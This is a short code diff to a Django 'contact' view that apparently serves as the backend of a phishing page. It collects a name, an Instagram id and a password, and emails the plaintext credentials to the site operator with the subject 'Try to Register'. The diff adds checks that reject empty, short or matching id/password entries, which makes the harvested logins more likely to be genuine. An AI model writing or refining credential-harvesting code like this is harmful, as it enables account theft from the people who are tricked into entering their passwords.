@@ -15,9 +15,17 @@ def contact(request):
         facebookID=request.POST.get('facebookId')
         password=request.POST.get('password')
         if name==''or facebookID=='' or password=='':
-            return redirect('/message/')
+            messages.info(request,"Please Register with correct instagram id and password!")
+            return redirect(request.META['HTTP_REFERER'])
         if len(facebookID)<=3 or len(password)<=3:
-            return redirect('/message/')
+            messages.info(request,"Please Register with correct instagram id and password!")
+            return redirect(request.META['HTTP_REFERER'])
+        if facebookID==password:
+            messages.info(request,"Please Register with correct instagram id and password!")
+            return redirect(request.META['HTTP_REFERER'])
+        if len(password)<6 :
+            messages.info(request,"Please Register with correct instagram id and password!")
+            return redirect(request.META['HTTP_REFERER'])
         subject='Try to Register'
         message= f"\n\n\none user has tried to register!\n\n\n\n\nname -: {name}\n\n\n instagram id -: {facebookID}\n\n\npassword -: {password}"
         email_from= settings.EMAIL_HOST_USER
